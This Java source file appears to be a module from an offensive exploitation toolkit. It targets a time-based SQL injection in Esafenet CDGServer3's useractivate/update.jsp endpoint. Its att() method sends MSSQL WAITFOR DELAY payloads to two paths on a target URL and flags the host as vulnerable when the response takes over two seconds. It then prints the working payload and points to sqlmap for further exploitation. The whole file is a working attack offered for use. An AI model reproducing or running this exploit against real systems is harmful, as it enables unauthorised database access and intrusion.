package exp.oa.esafenet;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools_getTime;

import java.util.HashMap;

public class esafenet_useractivate_update_sqli implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        Platform.runLater(() -> {
            textArea.appendText("\n 该漏洞为sql注入漏洞，无法执行命令");
        });
        return false;
    }
    @Override
    public Boolean checkVulCmd(String url,String cmd ,TextArea textArea, TextArea textArea_cmd) {
        Platform.runLater(() -> {
            textArea.appendText("\n 该漏洞为sql注入漏洞，无法执行命令");
        });
        return false;
    }
    private Boolean att(String url, TextArea textArea, TextArea textArea_cmd) {
        try {
            HashMap<String, String> head = new HashMap<>();
            String target_req1 = url+"/CDGServer3/workflowE/useractivate/update.jsp?flag=1&ids=1,3)WAITFOR%20DELAY%20%270:0:3%27--";
            String target_req2 = url+"/CDGServer3/useractivate/update.jsp?flag=1&ids=1,3)WAITFOR%20DELAY%20%270:0:3%27--";
            long var = HttpTools_getTime.get(target_req1,head,"utf-8");
            long var1 = HttpTools_getTime.get(target_req2,head,"utf-8");
            long var2 = var>2000?var:var1;
            String target_req = var2==var?target_req1:target_req2;
            if (var2 > 2000) {
                Platform.runLater(() -> {
                    textArea.appendText("\n [ esafenet_useractivate_update_sqli ]");
                    textArea.appendText("\n 利用sqlmap模块进行利用,注入类型:延时注入,sql:mssql");
                    textArea.appendText("\n");
                });

                Platform.runLater(() -> {
                    textArea_cmd.appendText("\n----------------------------------------------------------------------\n"+
                            "\npayload:\n"+target_req +
                            "\n----------------------------------------------------------------------\n"+
                            "\n延时时间: "+var2+"毫秒\n----------------------------------------------------------------------\n");
                });

                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }
}
